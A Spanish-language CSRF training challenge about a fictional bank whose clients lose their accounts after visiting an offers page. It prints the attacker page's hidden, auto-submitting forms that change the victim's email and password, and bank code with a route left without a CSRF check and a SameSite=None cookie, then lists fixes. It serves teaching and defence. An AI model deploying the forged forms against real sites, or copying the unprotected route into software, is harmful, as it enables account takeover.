El formulario oculto

Medio · ~12 min · Basado en el vídeo «No has pulsado nada… y tu contraseña ya no es tuya (CSRF)».

El caso. MiBanco, un banco ficticio (mibanco.example). Jueves 5/11. Varios clientes llaman porque ya no pueden recuperar su contraseña: alguien les ha cambiado el correo de la cuenta. Ninguno ha dado sus datos a nadie y todos dicen lo mismo: «Solo estaba mirando una web de ofertas». El banco te pasa el registro de su web, su cookie de sesión y un trozo de su código, y la página de ofertas que visitaban.

Tu misión: descubre desde qué web se hizo, a cuántos clientes les cambiaron el correo, por qué funcionó y qué arreglo lo cierra. Chuleta: en un CSRF (Cross-Site Request Forgery) otra web hace que tu navegador envíe una petición a una web en la que tienes la sesión abierta; el navegador adjunta tu cookie y la web cree que eres tú. No hace falta ningún clic.

1 · Registro de la web (mibanco.example) · 5/11, de 19:30 a 19:45

2 · La cookie de sesión y dos rutas del servidor del banco

Set-Cookie: sesion=8f3a9c…; Path=/; Secure; HttpOnly; SameSite=None
# 28/10: cambiado de Lax a None para que funcione el widget
#        del comparador de un socio (socio-comparador.example)

app.post('/cuenta/correo', requiereSesion, (req, res) => {
  cambiarCorreo(req.usuario, req.body.correo);
  res.send('Correo actualizado');
});

app.post('/cuenta/contrasena', requiereSesion, comprobarTokenCSRF, (req, res) => {
  cambiarContrasena(req.usuario, req.body.nueva);
  res.send('Contraseña actualizada');
});

3 · El código de la web de ofertas (ofertas-flash.example)

<h1>⚡ OFERTAS FLASH: auriculares a 9 €</h1>

<iframe name="nada" style="display:none"></iframe>
<form id="f" target="nada" method="POST"
      action="https://mibanco.example/cuenta/correo">
  <input type="hidden" name="correo" value="recupera@trampa.example">
</form>
<form id="g" target="nada" method="POST"
      action="https://mibanco.example/cuenta/contrasena">
  <input type="hidden" name="nueva" value="Ofertas2026!">
</form>

<script>
  // nada más cargar, sin que el visitante pulse nada
  f.submit();
  setTimeout(() => g.submit(), 800);
</script>

Reto completado

Bandera:

Lo que haría el banco: poner comprobarTokenCSRF en todas las rutas que cambian algo (no solo en /cuenta/contrasena); volver la cookie de sesión a SameSite=Lax (o Strict) y dar al widget del socio su propia cookie sin poder sobre la cuenta; rechazar en el servidor las peticiones que cambian algo con Origin de otro dominio o Sec-Fetch-Site: cross-site; pedir la contraseña actual (o un código en el móvil) para cambiar el correo; devolver el correo original a las 5 cuentas, cerrar sus sesiones y avisarles; y crear una alerta en el SIEM para picos de cambios de correo con el mismo Origin externo.
